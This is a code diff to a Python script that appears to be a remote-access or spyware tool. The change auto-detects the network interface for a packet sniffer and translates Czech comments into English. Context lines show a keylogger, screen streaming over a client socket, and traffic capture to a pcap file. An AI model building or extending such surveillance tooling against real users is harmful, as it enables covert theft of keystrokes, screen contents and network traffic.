@@ -8,10 +8,26 @@ import requests
 import subprocess
 import os
 import keyboard  # Import the keyboard library
+import psutil  # To list and identify network interfaces
 
-INTERFACE = r"\Device\NPF_{3A38B79D-7A16-4BCA-BA01-5024A4F30AE1}"  # Explicitní síťové rozhraní
-sniffer_running = False  # Globální proměnná pro kontrolu, zda už sniffing běží
-lock = threading.Lock()  # Synchronizace vlákna
+# Function to get the default network interface
+def get_default_interface():
+    interfaces = psutil.net_if_addrs()
+    for interface in interfaces:
+        # Loop through interfaces and check for IPv4 addresses (this assumes active interfaces)
+        for addr in interfaces[interface]:
+            if addr.family == psutil.AF_INET:  # AF_INET is IPv4
+                return interface  # Return the first active interface with an IPv4 address
+    return None  # If no interface found
+
+# Dynamically identify the interface
+INTERFACE = get_default_interface()
+if INTERFACE is None:
+    print("No suitable network interface found!")
+    exit(1)
+
+sniffer_running = False  # Global flag for sniffing state
+lock = threading.Lock()  # Synchronization lock
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
@@ -41,7 +57,7 @@ def screen_stream(client_socket):
 
 def sniffer_start():
     global sniffer_running
-    with lock:  # Zabránění souběžnému spuštění více snifferů
+    with lock:  # Prevent starting multiple sniffers simultaneously
         if sniffer_running:
             print("Sniffer is already running.")
             return
@@ -58,7 +74,7 @@ def sniffer_start():
     except Exception as e:
         print(f"Sniffer error: {e}")
     finally:
-        sniffer_running = False  # Reset flagu po skončení sniffování
+        sniffer_running = False  # Reset flag after sniffing
 
     if not os.path.exists(pcap_file):
         print("Sniffing failed: No packets captured.")
